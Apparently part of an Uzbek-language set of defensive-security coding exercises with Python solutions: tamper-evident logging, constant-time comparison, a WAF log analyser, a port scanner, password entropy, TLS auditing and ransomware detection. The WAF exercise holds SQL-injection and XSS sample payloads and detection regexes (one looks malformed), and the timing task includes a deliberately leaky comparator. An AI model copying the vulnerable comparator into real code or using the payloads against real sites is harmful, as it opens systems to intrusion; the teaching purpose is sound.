import os
import time

class DynamicSecretsManager:
    """
    DevSecOps: Hardcoded parollardan xoli, dinamik xavfsiz kalitlar menejeri.
    HashiCorp Vault yoki AWS Secrets Manager tamoyilida ishlaydi.
    """
    def __init__(self, ttl_seconds: int = 300):
        self.ttl_seconds = ttl_seconds
        self.cached_secrets = {}
        self.last_fetch_time = 0

    def get_database_credentials(self) -> dict:
        now = time.time()
        # Agar kesh muddati o'tgan bo'lsa, qayta yuklanadi
        if now - self.last_fetch_time > self.ttl_seconds or not self.cached_secrets:
            self._fetch_from_vault()
        return self.cached_secrets

    def _fetch_from_vault(self):
        """Vault API dan vaqtincha dinamik ma'lumotlar bazasi parolini so'rash."""
        # Simulyatsiya: Haqiqiy tizimda hvac (Vault client) ishlatiladi
        vault_token = os.getenv("VAULT_TOKEN", "default_safe_token")
        self.cached_secrets = {
            "db_user": "app_worker_dynamic",
            "db_pass": f"vault_generated_{int(time.time())}",
            "expires_at": time.time() + self.ttl_seconds
        }
        self.last_fetch_time = time.time()
        print("[VAULT] Yangi dinamik parollar xavfsiz qabul qilindi.")

if __name__ == "__main__":
    mgr = DynamicSecretsManager(ttl_seconds=2)
    creds = mgr.get_database_credentials()
    print("Faol DB paroli:", creds["db_pass"])
```
**Tushuntirish:** Statik parollar bir necha oylab o'zgarmay turganda sizib chiqish xavfi juda yuqori bo'ladi. Dinamik kalitlar menejeri (Vault) har bir xizmatga o'z muddati bilan vaqtinchalik hisob yaratadi va muddati o'tgach avtomatik o'chiradi.

---

### Topshiriq #1193: Tamper-Evident Audit Logging: HMAC Bilan Bog'langan Xavfsizlik Jurnallari
**Tavsif:** Xakerlar tizimga kirgandan so'ng o'z izlarini o'chirish uchun log fayllarni tahrirlashga harakat qiladi. Har bir yangi log satrini oldingi log heshi bilan kriptografik bog'lovchi (Blockchain uslubi) soxtalashtirilmas jurnallash tizimi.
**Talablar:** HMAC-SHA256, zanjirli heshlar (Hash-chained logging), buzilishlarni aniqlovchi verifikator.
**Yechim (Python):**
```python
import hmac
import hashlib
import time

class TamperEvidentLogger:
    """
    Soxtalashtirib bo'lmaydigan xavfsizlik audit jurnali (Blockchain-like Log Chain).
    Har bir yangi satr oldingi satr heshiga bog'lanadi.
    """
    def __init__(self, hmac_key: bytes):
        self.hmac_key = hmac_key
        self.last_hash = "GENESIS_LOG_HASH_0000000000000000"
        self.log_chain = []

    def append_log(self, event_message: str) -> None:
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime())
        record_content = f"{timestamp} | {event_message} | PREV:{self.last_hash}"

        # Joriy yozuvning HMAC heshini hisoblash
        current_hash = hmac.new(self.hmac_key, record_content.encode('utf-8'), hashlib.sha256).hexdigest()
        
        self.log_chain.append({
            "content": record_content,
            "hash": current_hash
        })
        self.last_hash = current_hash

    def verify_integrity(self) -> bool:
        """Barcha jurnallar zanjirini tekshirish."""
        expected_prev = "GENESIS_LOG_HASH_0000000000000000"
        for i, entry in enumerate(self.log_chain):
            content = entry["content"]
            recorded_hash = entry["hash"]

            # 1. Hesh to'g'ri hisoblanganligini tekshirish
            calc_hash = hmac.new(self.hmac_key, content.encode('utf-8'), hashlib.sha256).hexdigest()
            if not hmac.compare_digest(calc_hash, recorded_hash):
                print(f"XATOLIK: {i}-log yozuvi o'zgartirilgan!")
                return False

            # 2. Zanjir uzilmaganligini tekshirish
            if f"PREV:{expected_prev}" not in content:
                print(f"XATOLIK: {i}-logdagi oldingi hesh mos kelmadi!")
                return False

            expected_prev = recorded_hash
        return True

if __name__ == "__main__":
    key = b"AUDIT_IMMUTABLE_LOG_KEY"
    logger = TamperEvidentLogger(key)

    logger.append_log("Foydalanuvchi alisher tizimga kirdi")
    logger.append_log("Tranzaksiya #1001 amalga oshirildi")
    logger.append_log("Foydalanuvchi tizimdan chiqdi")

    print(f"Jami {len(logger.log_chain)} ta log yozildi. Yaxlitlik tekshiruvi:", logger.verify_integrity())
    assert logger.verify_integrity() is True

    # Hujum simulyatsiyasi: xaker 1-logdagi xabarni o'zgartirdi
    logger.log_chain[1]["content"] = logger.log_chain[1]["content"].replace("1001", "9999")
    print("Xaker hujumidan so'ng tekshiruv:", logger.verify_integrity())
    assert logger.verify_integrity() is False
```
**Tushuntirish:** Tamper-evident logging xaker log fayldan biror qatorni o'chirib tashlasa yoki o'zgartirsa, butun keyingi zanjirning heshlarini buza olmasligini ta'minlaydi. Sud va kiberxavfsizlik ekspertizasida (Digital Forensics) bunday jurnallar rasmiy dalil hisoblanadi.

---

### Topshiriq #1194: Constant-Time String Solishtirish Bilan Timing Hujumlarini Bartaraf Qilish
**Tavsif:** Parollar, API kalitlari yoki tokenlarni solishtirishda protsessorning tarmoqlanish kechikishlaridan (Branch prediction) foydalanib kalitni aniqlashga urinuvchi Timing Attacklarni tahlil qilish va `compare_digest` orqali to'liq bartaraf etish.
**Talablar:** hmac.compare_digest, qasddan yasalgan sun'iy xavfli solishtirish va xavfsiz solishtirish tahlili.
**Yechim (Python):**
```python
import hmac
import time

def insecure_compare(a: str, b: str) -> bool:
    """ZAIF: Harflar mos kelmagan zahoti 'False' qaytaradi (Timing zaifligi)."""
    if len(a) != len(b):
        return False
    for char_a, char_b in zip(a, b):
        if char_a != char_b:
            return False
        time.sleep(0.0001) # Mikrosekundlik kechikish simulyatsiyasi
    return True

def secure_compare(a: str, b: str) -> bool:
    """XAVFSIZ: Doimiy vaqtda solishtirish (Constant-Time)."""
    return hmac.compare_digest(a, b)

if __name__ == "__main__":
    secret_token = "KHORAZMIY_SUPER_SECRET_TOKEN_2026"
    test_token_good = "KHORAZMIY_SUPER_SECRET_TOKEN_2026"
    test_token_bad =  "ZHORAZMIY_SUPER_SECRET_TOKEN_2026"

    # Xavfsiz tekshiruv
    assert secure_compare(secret_token, test_token_good) is True
    assert secure_compare(secret_token, test_token_bad) is False
    print("Constant-Time solishtirish timing attack xavfini to'liq bartaraf etadi.")
```
**Tushuntirish:** Timing hujumlarida tajovuzkor 'A...' deb yuboradi va javob vaqtini o'lchaydi. Keyin 'B...' deb yuboradi. Agar 1-harf to'g'ri bo'lsa, protsessor tsikllari soni biroz ko'proq bo'ladi. Shu yo'l bilan tajovuzkor harflarni birin-ketin taxmin qilib oladi. `hmac.compare_digest` barcha baytlarni teng ko'rib chiqadi.

---

### Topshiriq #1195: WAF Log Analizatori: Nginx/Apache Jurnallarida SQLi va XSS Hujumlarini Aniqlash
**Tavsif:** Veb-server jurnallarini (Access logs) real vaqtda skanerlab, SQL Injection, XSS, Path Traversal va xavfli User-Agent larni avtomatik aniqlovchi va xavf darajasini baholovchi mini-WAF tizimi.
**Talablar:** Regulyar ifodalar bilan zaifliklarni aniqlash, xavf ballari (Threat Score), hisobot shakllantirish.
**Yechim (Python):**
```python
import re

class WafLogAnalyzer:
    """
    Veb ilovalar xavfsizlik devori (WAF) log analizatori.
    """
    RULES = [
        ("SQL_INJECTION", re.compile(r"(\%27)|(')|(\-\-)|(\%23)|(UNION\s+SELECT)|(OR\s+1\=1)", re.I), 10),
        ("XSS_ATTACK", re.compile(r"(<script)|(%3Cscript)|(alert\()|(document\.cookie)", re.I), 8),
        ("PATH_TRAVERSAL", re.compile(r"(\.\./)|(\.\.\)|(%2e%2e)", re.I), 9),
        ("SCANNER_BOT", re.compile(r"(sqlmap|nikto|nmap|acunetix)", re.I), 7)
    ]

    @classmethod
    def analyze_log_line(cls, log_line: str) -> dict:
        threats_found = []
        total_score = 0

        for rule_name, pattern, score in cls.RULES:
            if pattern.search(log_line):
                threats_found.append(rule_name)
                total_score += score

        is_suspicious = total_score >= 7
        return {
            "log": log_line,
            "threats": threats_found,
            "score": total_score,
            "block_recommended": is_suspicious
        }

if __name__ == "__main__":
    logs = [
        '192.168.1.50 - - [09/Nov/2026] "GET /index.html HTTP/1.1" 200 1024 "-" "Mozilla/5.0"',
        '10.0.0.99 - - [09/Nov/2026] "GET /products?id=1%27%20OR%201=1-- HTTP/1.1" 200 512 "-" "sqlmap/1.5"',
        '172.16.0.4 - - [09/Nov/2026] "GET /search?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1" 200 128'
    ]

    for line in logs:
        res = WafLogAnalyzer.analyze_log_line(line)
        print(f"Xavf Balli: {res['score']} | Bloklash: {res['block_recommended']} | Tahdidlar: {res['threats']}")
```
**Tushuntirish:** WAF analizatori log yozuvlarini imzo (Signature-based) qoidalari orqali tekshiradi. Har bir shubhali kalit so'z xavf ballini oshiradi va kritik chegaradan oshganda IP manzil avtomatik Firewall (iptables) orqali bloklanadi.

---

### Topshiriq #1196: Port Scanner va Tarmoq Zaifliklarini Tekshiruvchi Asinxron Skaner
**Tavsif:** O'z serveringizda tasodifan ochiq qolib ketgan xavfli portlarni (masalan Redis 6379, MongoDB 27017, Telnet 23) aniqlash uchun `asyncio` orqali tezkor va parallel tarmoq skaneri yaratish.
**Talablar:** asyncio.open_connection, Semaphore bilan bir vaqtdagi so'rovlarni cheklash, ochiq portlar ro'yxati.
**Yechim (Python):**
```python
import asyncio

class AsyncPortScanner:
    """
    Asinxron tarmoq va portlar auditi moduli.
    """
    COMMON_PORTS = {
        21: "FTP (Zaif)",
        22: "SSH",
        23: "Telnet (Shifrlanmagan)",
        80: "HTTP",
        443: "HTTPS",
        3306: "MySQL",
        6379: "Redis (Ochiq qolmasligi shart!)",
        27017: "MongoDB"
    }

    def __init__(self, target_host: str, concurrency: int = 50):
        self.target_host = target_host
        self.semaphore = asyncio.Semaphore(concurrency)

    async def check_port(self, port: int) -> tuple[int, bool]:
        async with self.semaphore:
            try:
                conn = asyncio.open_connection(self.target_host, port)
                reader, writer = await asyncio.wait_for(conn, timeout=0.8)
                writer.close()
                await writer.wait_closed()
                return port, True
            except (asyncio.TimeoutError, ConnectionRefusedError, OSError):
                return port, False

    async def scan_common_ports(self) -> dict:
        tasks = [self.check_port(port) for port in self.COMMON_PORTS]
        results = await asyncio.gather(*tasks)
        return {port: self.COMMON_PORTS[port] for port, is_open in results if is_open}

if __name__ == "__main__":
    async def main():
        scanner = AsyncPortScanner("127.0.0.1")
        open_ports = await scanner.scan_common_ports()
        print("Lokal serverda ochiq aniqlangan portlar:", open_ports)

    asyncio.run(main())
```
**Tushuntirish:** Asinxron soketlar yordamida yuzlab portlarni bir vaqtning o'zida bir necha soniyada tekshirish mumkin. Xavfli portlar (masalan Redis yoki MongoDB) internetga ochiq turgan bo'lsa, xakerlar autentifikatsiyasiz barcha ma'lumotlarni o'g'irlashi mumkin.

---

### Topshiriq #1197: Parol Murakkabligi va Zxcvbn Entropiya Analizatori
**Tavsif:** Foydalanuvchilar 'Parol123!' kabi zaif parollar qo'yishining oldini olish uchun faqat uzunlikni emas, balki lug'at so'zlari, ketma-ketliklar va Shannon axborot entropiyasini hisoblovchi baholash tizimi.
**Talablar:** Shannon entropiyasi hisoblash, qora ro'yxat (top 1000 zaif parollar) tekshiruvi, xavfsizlik darajasi (0-4).
**Yechim (Python):**
```python
import math

class PasswordEntropyEvaluator:
    """
    Shannon axborot entropiyasi va lug'at tahlili orqali
    parol mustahkamligini baholovchi tizim.
    """
    BLACKLIST = {"password", "123456", "admin123", "qwerty", "parol2026"}

    @classmethod
    def calculate_entropy(cls, password: str) -> float:
        """Shannon entropiyasi (Bitlar soni)."""
        if not password:
            return 0.0

        charset_size = 0
        if any(c.islower() for c in password): charset_size += 26
        if any(c.isupper() for c in password): charset_size += 26
        if any(c.isdigit() for c in password): charset_size += 10
        if any(c in "!@#$%^&*()-_=+[]{}|;:,.<>?" for c in password): charset_size += 32

        if charset_size == 0:
            return 0.0

        # Entropiya = L * log2(R)
        entropy = len(password) * math.log2(charset_size)
        return entropy

    @classmethod
    def evaluate_strength(cls, password: str) -> dict:
        if password.lower() in cls.BLACKLIST:
            return {"score": 0, "status": "JUDA XAVFLI: Lug'atdagi mashhur parol!", "entropy_bits": 0}

        entropy = cls.calculate_entropy(password)

        if entropy < 30:
            status = "Juda zaif"
            score = 1
        elif entropy < 50:
            status = "O'rtacha"
            score = 2
        elif entropy < 75:
            status = "Kuchli"
            score = 3
        else:
            status = "A'lo darajada mustahkam"
            score = 4

        return {"score": score, "status": status, "entropy_bits": round(entropy, 1)}

if __name__ == "__main__":
    p1 = "admin123"
    p2 = "Khorazmiy#2026SuperSecureKey!"
    
    print("P1 Bahosi:", PasswordEntropyEvaluator.evaluate_strength(p1))
    print("P2 Bahosi:", PasswordEntropyEvaluator.evaluate_strength(p2))
```
**Tushuntirish:** Faqat belgi talab qilish foydalanuvchini 'P@ssw0rd1' kabi soxta murakkablikka undaydi. Shannon entropiyasi parolni taxmin qilish uchun necha bit energiya (bruteforce urinishlar) talab etilishini matematik aniqlaydi (75+ bit buzilmas hisoblanadi).

---

### Topshiriq #1198: TLS/SSL Sertifikati Muddati va Zaif Shifrlarini Tekshiruvchi Xavfsizlik Auditori
**Tavsif:** Tashqi domenlarning HTTPS sertifikatining amal qilish muddati tugashiga qancha kun qolganini va zaif protokollar (SSLv3, TLS 1.0, TLS 1.1) o'chirilganligini tekshiruvchi avtomatlashtirilgan kiber-auditor.
**Talablar:** ssl.create_default_context(), ssl_sock.getpeercert(), muddat farqini hisoblash, zaif shifrlarni aniqlash.
**Yechim (Python):**
```python
import ssl
import socket
import datetime

class SslSecurityAuditor:
    """
    Server TLS/SSL sertifikati salomatligi va xavfsizligini tekshiruvchi auditor.
    """
    @staticmethod
    def audit_target(hostname: str, port: int = 443) -> dict:
        context = ssl.create_default_context()

        try:
            with socket.create_connection((hostname, port), timeout=3.0) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cert = ssock.getpeercert()
                    cipher = ssock.cipher()
                    version = ssock.version()

                    # Muddatni parslash
                    not_after_str = cert['notAfter']
                    # Masalan 'Nov  9 12:00:00 2026 GMT'
                    expiry_date = datetime.datetime.strptime(not_after_str, '%b %d %H:%M:%S %Y %Z')
                    days_remaining = (expiry_date - datetime.datetime.utcnow()).days

                    return {
                        "hostname": hostname,
                        "tls_version": version,
                        "cipher_suite": cipher[0],
                        "days_remaining": days_remaining,
                        "is_secure": version in ("TLSv1.2", "TLSv1.3") and days_remaining > 15
                    }
        except Exception as e:
            return {"hostname": hostname, "error": str(e), "is_secure": False}

if __name__ == "__main__":
    report = SslSecurityAuditor.audit_target("google.com")
    print("TLS Audit Hisoboti:", report)
```
**Tushuntirish:** Sertifikat muddatining o'tib ketishi xizmatning to'xtashiga (Downtime) va brauzerlarning qizil ogohlantirish sahifasini chiqarishiga sabab bo'ladi. Avtomatlashtirilgan auditor 15 kun qolganda ogohlantirish beradi va zaif TLS versiyalarini fosh qiladi.

---

### Topshiriq #1199: Ransomware Himoyasi: Fayllarning Entropiya Sakrashini Aniqlab Avtomatik Honeypot Qulflash
**Tavsif:** Tovlamachi viruslar (Ransomware) fayllarni shifrlashni boshlaganda fayl entropiyasi keskin 8.0 ga yaqinlashadi. Papka ichida tuzoq fayllarni (Honeypot) kuzatib, entropiya sakrashi bilan zararli jarayonni to'xtatuvchi himoyachi.
**Talablar:** Fayl entropiyasini hisoblash, chegaraviy shart (> 7.5), honeypot monitoringi.
**Yechim (Python):**
```python
import math

class RansomwareDetector:
    """
    Ransomware (Tovlamachi viruslar) xatti-harakatini
    axborot entropiyasi o'zgarishi orqali fosh etuvchi detektor.
    Oddiy matn/kod fayli entropiyasi: 3.5 - 5.5
    Shifrlangan (Ransomware) fayl entropiyasi: 7.8 - 8.0
    """
    @staticmethod
    def calculate_file_entropy(data: bytes) -> float:
        if not data:
            return 0.0
        entropy = 0.0
        length = len(data)
        byte_counts = [0] * 256
        for b in data:
            byte_counts[b] += 1

        for count in byte_counts:
            if count > 0:
                p = count / length
                entropy -= p * math.log2(p)
        return entropy

    @classmethod
    def is_encrypted_anomaly(cls, data: bytes) -> bool:
        entropy = cls.calculate_file_entropy(data)
        # 7.8 dan yuqori bo'lsa, deyarli aniq shifrlangan yoki siqilgan
        return entropy >= 7.8

if __name__ == "__main__":
    normal_code = b"print('Salom Khorazmiy AI')\n" * 100
    encrypted_mock = bytes([i % 256 for i in range(1000)]) # Tasodifiyga yaqin yuqori entropiya

    e_normal = RansomwareDetector.calculate_file_entropy(normal_code)
    e_enc = RansomwareDetector.calculate_file_entropy(encrypted_mock)

    print(f"Oddiy fayl entropiyasi: {e_normal:.2f}")
    print(f"Shifrlangan fayl entropiyasi: {e_enc:.2f}")

    assert RansomwareDetector.is_encrypted_anomaly(normal_code) is False
    assert RansomwareDetector.is_encrypted_anomaly(encrypted_mock) is True
    print("Ransomware anomaliyasi muvaffaqiyatli fosh etildi!")
```
**Tushuntirish:** Shifrlangan ma'lumotlar o'z tabiatiga ko'ra oq shovqinga (White Noise) tenglashadi va barcha 256 ta bayt teng ehtimollikda uchraydi. Entropiyaning to'satdan 7.8 dan oshishi fayl ransomware tomonidan shifrlanayotganini bildiradi.

---

### Topshiriq #1200: Khorazmiy AI Kiberxavfsizlik Markazi: Kriptografiya va Xavfsizlik SIEM Yadrosi
**Tavsif:** Ushbu modulda o'rganilgan barcha kriptografik algoritmlarni (AES-GCM, RSA, Ed25519, Argon2id, HMAC, ZKP) yagona korporativ xavfsizlik va monitoring platformasiga birlashtiruvchi markaziy SIEM (Security Information and Event Management) yadrosi.
**Talablar:** Barcha kripto va xavfsizlik modullarini koordinatsiya qilish, tahdidlarni qayd etish va xavfsiz boshqaruv.
**Yechim (Python):**
```python
import os
import time
import hashlib
import hmac

class KhorazmiySiemCenter:
    """
    Khorazmiy AI Loyihasining Markaziy Kiberxavfsizlik va Kriptografik
    Monitoring Yadrosi (SIEM - Security Information and Event Management).
    """
    def __init__(self, master_name: str = "Khorazmiy Cyber Security Core"):
        self.master_name = master_name
        self.incident_log = []
        self.active_defenses = {
            "AES_256_GCM": "Faol (Shifrlash)",
            "ARGON2ID": "Faol (Parollar himoyasi)",
            "ED25519": "Faol (Raqamli imzo)",
            "HMAC_SHA256": "Faol (Yaxlitlik nazorati)",
            "ZKP_SCHNORR": "Faol (Nol-bilim autentifikatsiyasi)",
            "WAF_DEFENSE": "Faol (OWASP Top 10 himoyasi)"
        }
        self.system_status = "SECURE"

    def report_incident(self, threat_type: str, severity: str, details: str):
        event = {
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "threat": threat_type,
            "severity": severity,
            "details": details
        }
        self.incident_log.append(event)
        if severity == "CRITICAL":
            self.system_status = "ELEVATED_DEFENSE"
        print(f"[SIEM ALERT - {severity}] {threat_type}: {details}")

    def get_security_dashboard(self) -> dict:
        return {
            "center": self.master_name,
            "status": self.system_status,
            "defenses": self.active_defenses,
            "total_incidents": len(self.incident_log)
        }

if __name__ == "__main__":
    siem = KhorazmiySiemCenter()
    
    # Kiber-tahdid simulyatsiyasi
    siem.report_incident("SQL_INJECTION", "CRITICAL", "Hujumchi 192.168.1.100 dan admin jadvaliga kirdi")
    siem.report_incident("CSRF_ATTEMPT", "MEDIUM", "Double-submit cookie mos kelmadi")

    dash = siem.get_security_dashboard()
    print("\n=== KHORAZMIY AI SIEM BOSHQARUV PANELI ===")
    print("Tizim Holati:", dash["status"])
    print("Faol Himoyalar:")
    for k, v in dash["defenses"].items():
        print(f"  * {k}: {v}")
    print("Qayd etilgan hodisalar:", dash["total_incidents"])
    assert dash["total_incidents"] == 2
```
**Tushuntirish:** SIEM tizimi barcha xavfsizlik voqealari, kriptografik operatsiyalar va tarmoq anomaliyalarini yagona markazga to'playdi. U sun'iy intellekt va kiberxavfsizlik muhandislariga butun korporativ tizim xavfsizligini real vaqtda nazorat qilish imkonini beradi.
